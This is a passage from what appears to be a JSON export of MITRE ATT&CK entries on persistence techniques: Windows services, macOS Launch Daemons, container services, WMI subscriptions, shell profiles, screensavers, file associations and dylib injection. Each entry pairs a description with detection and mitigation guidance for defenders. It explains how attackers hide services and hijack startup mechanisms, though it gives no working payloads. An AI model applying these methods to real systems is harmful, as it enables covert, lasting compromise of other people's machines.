href=\"https://unit42.paloaltonetworks.com/acidbox-rare-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 AcidBox June 2020)</a>\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution.\n\nTo make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e., Hide Artifacts), for example by using the <code>sc sdset</code> command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as <code>Get-Service</code>, <code>sc query</code>, and <code>services.exe</code>. <a href=\"https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS 1)</a> <a href=\"https://www.sans.org/blog/defense-spotlight-finding-hidden-windows-services/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS 2)</a>","detection":"Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \n\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>  \n\nCreation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 <a href=\"https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4697\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft 4697 APR 2017)</a> <a href=\"https://docs.microsoft.com/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Event Forwarding FEB 2018)</a>). New, benign services may be created during installation of new software.\n\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","Process: Process Creation","Network Traffic: Network Traffic Flow","Service: Service Creation","Command: Command Execution","File: File Metadata","Windows Registry: Windows Registry Key Creation","Driver: Driver Load","Service: Service Modification","Process: OS API Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."},{"id":"M1028","name":"Operating System Configuration","description":"Ensure that Driver Signature Enforcement is enabled to restrict unsigned drivers from being installed."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent an application from writing a signed vulnerable driver to the system. <a href=\"https://www.microsoft.com/security/blog/2021/12/08/improve-kernel-security-with-the-new-microsoft-vulnerable-and-malicious-driver-reporting-center/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malicious Driver Reporting Center)</a> On Windows 10 and 11, enable Microsoft Vulnerable Driver Blocklist to assist in hardening against third party-developed service drivers. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft driver block rules)</a>"},{"id":"M1045","name":"Code Signing","description":"Enforce registration and execution of only legitimately signed service drivers where possible."},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them."}]},{"id":"T1543.004","name":"Launch Daemon","description":"Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppleDocs Launch Agent Daemons)</a> <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Methods of Mac Malware Persistence)</a> <a href=\"https://www.real-world-systems.com/docs/launchdPlist.1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: launchd Keywords for plists)</a>\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions. <a href=\"https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WireLurker)</a> <a href=\"https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Malware Detection)</a>\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files. <a href=\"https://bradleyjkemp.dev/post/launchdaemon-hijacking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LaunchDaemon Hijacking)</a> <a href=\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sentinelone macos persist Jun 2019)</a>","detection":"Monitor for new files added to the <code>/Library/LaunchDaemons/</code> folder. The System LaunchDaemons are protected by SIP.\n\nSome legitimate LaunchDaemons point to unsigned code that could be exploited. For Launch Daemons with the <code>RunAtLoad</code> parameter set to true, ensure the <code>Program</code> parameter points to signed code or executables are in alignment with enterprise policy. Some parameters are interchangeable with others, such as <code>Program</code> and <code>ProgramArguments</code> parameters but one must be present. <a href=\"https://www.real-world-systems.com/docs/launchdPlist.1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: launchd Keywords for plists)</a>","platforms":["macOS"],"dataSources":["Process: Process Creation","File: File Creation","File: File Modification","Service: Service Modification","Command: Command Execution","Service: Service Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create new Launch Daemons."},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting folder permissions abuse opportunities on systems, especially reviewing changes made to folders by third-party software."}]},{"id":"T1543.005","name":"Container Service","description":"Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.\n\nFor example, by using the <code>docker run</code> or <code>podman run</code> command with the <code>restart=always</code> directive, a container can be configured to persistently restart on the host. <a href=\"https://blog.aquasec.com/teamtnt-reemerged-with-new-aggressive-cloud-campaign\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AquaSec TeamTNT 2023)</a> A user with access to the (rootful) docker command may also be able to escalate their privileges on the host. <a href=\"https://gtfobins.github.io/gtfobins/docker/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GTFOBins Docker)</a>\n\nIn Kubernetes environments, DaemonSets allow an adversary to persistently Deploy Containers on all nodes, including ones added later to the cluster. <a href=\"https://blog.aquasec.com/leveraging-kubernetes-rbac-to-backdoor-clusters\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aquasec Kubernetes Attack 2023)</a> <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes DaemonSet)</a> Pods can also be deployed to specific nodes using the <code>nodeSelector</code> or <code>nodeName</code> fields in the pod spec. <a href=\"https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Assigning Pods to Nodes)</a> <a href=\"https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppSecco Kubernetes Namespace Breakout 2020)</a>\n\nNote that containers can also be configured to run as Systemd Services. <a href=\"https://www.redhat.com/sysadmin/podman-run-pods-systemd-services\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Podman Systemd)</a> <a href=\"https://docs.docker.com/config/containers/start-containers-automatically/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Systemd)</a>","detection":"","platforms":["Containers"],"dataSources":["Command: Command Execution","Container: Container Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit access to utilities such as docker to only users who have a legitimate need, especially if using docker in rootful mode. In Kubernetes environments, only grant privileges to deploy pods to users that require it."},{"id":"M1054","name":"Software Configuration","description":"Where possible, consider enforcing the use of container services in rootless mode to limit the possibility of privilege escalation or malicious effects on the host running the container."}]}]},{"id":"T1546","name":"Event Triggered Execution","description":"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events. <a href=\"https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Backdooring an AWS account)</a> <a href=\"https://www.varonis.com/blog/power-automate-data-exfiltration\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Varonis Power Automate Data Exfiltration)</a> <a href=\"https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DART Case Report 001)</a>\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WMI 2015)</a> <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malware Persistence on OS X)</a> <a href=\"https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: amnesia malware)</a>\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.","detection":"Monitoring for additions or modifications of mechanisms that could be used to trigger event-based execution, especially the addition of abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network. Also look for changes that do not line up with updates, patches, or other planned administrative activity. \n\nThese mechanisms may vary by OS, but are typically stored in central repositories that store configuration information such as the Windows Registry, Common Information Model (CIM), and/or specific named files, the last of which can be hashed and compared to known good values. \n\nMonitor for processes, API/System calls, and other common ways of manipulating these event repositories. \n\nTools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.  \n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.","platforms":["Linux","macOS","Windows","SaaS","IaaS","Office Suite"],"dataSources":["Module: Module Load","WMI: WMI Creation","File: File Metadata","File: File Creation","File: File Modification","Windows Registry: Windows Registry Key Modification","Command: Command Execution","Cloud Service: Cloud Service Modification","Process: Process Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root."},{"id":"M1051","name":"Update Software","description":"Perform regular software updates to mitigate exploitation risk."}],"subTechniques":[{"id":"T1546.001","name":"Change Default File Association","description":"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. <a href=\"https://support.microsoft.com/en-us/help/18539/windows-7-change-default-programs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Change Default Programs)</a> <a href=\"http://msdn.microsoft.com/en-us/library/bb166549.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft File Handlers)</a> <a href=\"https://docs.microsoft.com/windows-server/administration/windows-commands/assoc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Assoc Oct 2017)</a> Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>. For example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. <a href=\"https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fakeav.gzd\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro TROJ-FAKEAV OCT 2012)</a>","detection":"Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process.\n\nUser file association preferences are stored under <code> [HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts</code> and override associations configured under <code>[HKEY_CLASSES_ROOT]</code>. Changes to a user's preference will occur under this entry's subkeys.\n\nAlso look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Windows Registry: Windows Registry Key Modification"],"mitigations":[]},{"id":"T1546.002","name":"Screensaver","description":"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. <a href=\"https://en.wikipedia.org/wiki/Screensaver\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Screensaver)</a> The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Gazer Aug 2017)</a>","detection":"Monitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.\n\nTools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated.","platforms":["Windows"],"dataSources":["File: File Modification","File: File Creation","Command: Command Execution","Process: Process Creation","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Block .scr files from being executed from non-standard locations."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Use Group Policy to disable screensavers if they are unnecessary. <a href=\"https://technet.microsoft.com/library/cc938799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Screensaver GP)</a>"}]},{"id":"T1546.003","name":"Windows Management Instrumentation Event Subscription","description":"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime. <a href=\"https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2015)</a>\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WMI SANS 2015)</a> <a href=\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WMI 2015)</a> Adversaries may also compile WMI scripts – using <code>mofcomp.exe</code>  –into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. <a href=\"https://www.secureworks.com/blog/wmi-persistence\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell WMI Persistence)</a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft MOF May 2018)</a>\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.","detection":"Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a> <a href=\"https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Detecting WMI Persistence)</a> Monitor for the creation of new WMI <code>EventFilter</code>, <code>EventConsumer</code>, and <code>FilterToConsumerBinding</code> events. Event ID 5861 is logged on Windows 10 systems when new <code>EventFilterToConsumerBinding</code> events are created. <a href=\"https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic - Hunting for Persistence Part 1)</a>\n\nMonitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent</code> PowerShell cmdlet, as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process). <a href=\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Register-WmiEvent)</a>","platforms":["Windows"],"dataSources":["File: File Creation","Process: Process Creation","Command: Command Execution","WMI: WMI Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"By default, only administrators are allowed to connect remotely using WMI; restrict other users that are allowed to connect, or disallow all users from connecting remotely to WMI."},{"id":"M1026","name":"Privileged Account Management","description":"Prevent credential overlap across systems of administrator and privileged accounts. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WMI 2015)</a>"},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent malware from abusing WMI to attain persistence. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"}]},{"id":"T1546.004","name":"Unix Shell Configuration Modification","description":"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files. <a href=\"https://www.intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: intezer-kaiji-malware)</a> <a href=\"https://web.archive.org/web/20220316014323/http://bencane.com/2013/09/16/understanding-a-little-more-about-etcprofile-and-etcbashrc/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: bencane blog bashrc)</a> These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely. <a href=\"https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: anomali-rocke-tactics)</a> <a href=\"https://wiki.archlinux.org/index.php/Bash#Invocation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux manual bash invocation)</a> Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. <a href=\"https://unit42.paloaltonetworks.com/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tsunami)</a> <a href=\"https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: anomali-rocke-tactics)</a> <a href=\"https://www.anomali.com/blog/pulling-linux-rabbit-rabbot-malware-out-of-a-hat\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: anomali-linux-rabbit)</a> <a href=\"https://blog.sucuri.net/2018/05/shell-logins-as-a-magento-reinfection-vector.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Magento)</a> Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. <a href=\"https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ScriptingOSX zsh)</a> <a href=\"https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PersistentJXA_leopitt)</a> <a href=\"https://github.com/D00MFist/PersistentJXA/blob/master/BashProfilePersist.js\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: code_persistence_zsh)</a> <a href=\"https://cedowens.medium.com/macos-ms-office-sandbox-brain-dump-4509b5fed49a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: macOS MS office sandbox escape)</a> The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.","detection":"While users may customize their shell profile files, there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.\n\nMonitor for changes to <code>/etc/profile</code> and <code>/etc/profile.d</code>, these files should only be modified by system administrators. MacOS users can leverage Endpoint Security Framework file events monitoring these specific files. <a href=\"https://objective-see.com/blog/blog_0x48.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESF_filemonitor)</a> \n\nFor most Linux and macOS systems, a list of file paths for valid shell options available on a system are located in the <code>/etc/shells</code> file.","platforms":["Linux","macOS"],"dataSources":["Process: Process Creation","File: File Creation","Command: Command Execution","File: File Modification"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Making these files immutable and only changeable by certain administrators will limit the ability for adversaries to easily create user level persistence."}]},{"id":"T1546.005","name":"Trap","description":"Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.\n\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received. <a href=\"https://ss64.com/bash/trap.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trap Manual)</a> <a href=\"https://bash.cyberciti.biz/guide/Trap_statement\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyberciti Trap Statements)</a>","detection":"Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.","platforms":["macOS","Linux"],"dataSources":["File: File Creation","Process: Process Creation","Command: Command Execution","File: File Modification"],"mitigations":[]},{"id":"T1546.006","name":"LC_LOAD_DYLIB Addition","description":"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. <a href=\"https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Writing Bad Malware for OSX)</a> There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time. <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malware Persistence on OS X)</a>","detection":"Monitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.","platforms":["macOS"],"dataSources":["Command: Command Execution","File: File Metadata","Process: Process Creation","File: File Modification","Module: Module Load"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Allow applications via known hashes."},{"id":"M1045","name":"Code Signing","description":"Enforce that all binaries be signed by the correct Apple Developer IDs."},{"id":"M1047","name":"Audit","description":"Binaries can also be baselined for what dynamic libraries they require, and if an app requires a new dynamic library that wasn't included as part of an update, it should be investigated."}]},{"id":"T1546.007","name":"Netsh Helper DLL","description":"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. <a href=\"https://technet.microsoft.com/library/bb490939.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Netsh)</a> The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe helper DLLs to 